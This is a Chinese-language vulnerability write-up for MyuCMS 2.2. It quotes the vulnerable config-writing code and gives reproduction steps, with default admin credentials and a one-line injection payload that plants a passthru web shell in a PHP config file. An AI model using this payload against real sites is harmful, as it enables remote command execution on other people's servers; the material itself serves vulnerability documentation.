## 1. 漏洞介绍

MyuCMS开源内容管理系统,采用ThinkPHP开发而成的社区商城聚合，插件，模板，轻便快捷容易扩展 其2.2版本中admin.php/config/add方法存在任意命令执行漏洞.

[Arbitrary command execution of Myucms v2.2 config.php add() method · Issue #6 · lolipop1234/XXD · GitHub](https://github.com/lolipop1234/XXD/issues/6)

相关源码【application/admin/controller/Config.php】

```php
public function add()
    {
       $path = 'application/extra/web.php';
       $file = include $path;      // $file 的内容为 web.php 中返回的配置数组的值
       $config = array( // 读取 post 中提交的配置内容
         'WEB_RXT' => input('WEB_RXT'),
         'WEB_GL' => input('WEB_GL'),
         'WEB_REG' => input('WEB_REG'),
         'WEB_TAG' => input('WEB_TAG'),
         'WEB_OPE' => input('WEB_OPE'),
         'WEB_BUG' => input('WEB_BUG'),
         'WEB_BBS' => input('WEB_BBS'),
         'WEB_SHOP' => input('WEB_SHOP'),
         'WEB_INDEX' => input('WEB_INDEX'),
         'WEB_KEJIAN' => input('WEB_KEJIAN'),
         'WEB_KEJIANS' => input('WEB_KEJIANS'),
         'Cascade' => input('Cascade'),
         //七牛
         'bucket' => input('bucket'),
         'accessKey' => input('accessKey'),
         'secrectKey' => input('secrectKey'),
         'domain' => input('domain'),
         'qiniuopen' => input('qiniuopen'),
       );
        $res = array_merge($file, $config); // 合并两个数组
        $str = '<?php return [';
        foreach ($res as $key => $value) { // 循环数组，生成新的配置内容
            $str .= '\'' . $key . '\'' . '=>' . '\'' . $value . '\'' . ',';
        }
        $str .= ']; ';
        if (file_put_contents($path, $str)) { // 将配置内容写入 web.php 文件
            return json(array('code' => 200, 'msg' => '修改成功'));
        } else {
            return json(array('code' => 0, 'msg' => '修改失败'));
        }
    }
```

`$config` 未对参数内容做验证，而直接通过循环遍历，拼接到了php后缀的配置文件中。

## 2. 漏洞复现

后台登陆信息：admin/admin/123456，示例  

```php
',passthru($_POST["cmd"]),'
',phpinfo(),'
```

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312241628344.png)

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312241629794.png)

注，下面问题，post 提交 cmd 就可解决

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312241631108.png)
